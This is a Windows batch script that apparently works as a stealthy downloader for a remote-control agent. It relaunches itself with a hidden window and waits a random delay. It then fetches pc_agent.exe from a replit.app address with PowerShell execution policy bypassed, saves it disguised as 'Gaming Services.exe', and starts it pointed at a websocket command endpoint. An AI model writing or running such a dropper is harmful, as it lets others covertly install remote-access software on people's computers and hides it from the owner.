@echo off
setlocal

:: Ensure the script runs completely hidden in the background
if "%1" neq "hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList hidden -WindowStyle Hidden"
    exit /b
)

:: Wait for a random floating-point time between 3.00 and 10.00 seconds
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$randomSeconds = (Get-Random -Minimum 3.0 -Maximum 10.0); [System.Threading.Thread]::Sleep([int]($randomSeconds * 1000))"

set "SCRIPT_DIR=%~dp0"
set "AGENT_EXE=%SCRIPT_DIR%Gaming Services.exe"
set "AGENT_URL=https://pc-build-dashboardzip--kilexrawr.replit.app//api/download/pc_agent.exe"
set "WS_URL=wss://pc-build-dashboardzip--kilexrawr.replit.app/ws"

taskkill /F /IM pc_agent.exe >nul 2>&1

if exist "%AGENT_EXE%" (
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$file = Get-Item '%AGENT_EXE%'; " ^
    "$sizeMB = $file.Length / 1MB; " ^
    "$minutesSinceMod = ((Get-Date) - $file.LastWriteTime).TotalMinutes; " ^
	"if ($sizeMB -gt 15 -or $minutesSinceMod -gt 4) { Remove-Item '%AGENT_EXE%' -Force; exit 1 } else { exit 0 }"
)

if %ERRORLEVEL% EQU 0 exit /b 0

if not exist "%AGENT_EXE%" (
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "Invoke-WebRequest -Uri '%AGENT_URL%' -OutFile '%AGENT_EXE%'"
)

if not exist "%AGENT_EXE%" (
    echo Failed to locate or download pc_agent.exe
    pause
    exit /b 1
)

start "" /B "%AGENT_EXE%" "%WS_URL%"

exit /b 0
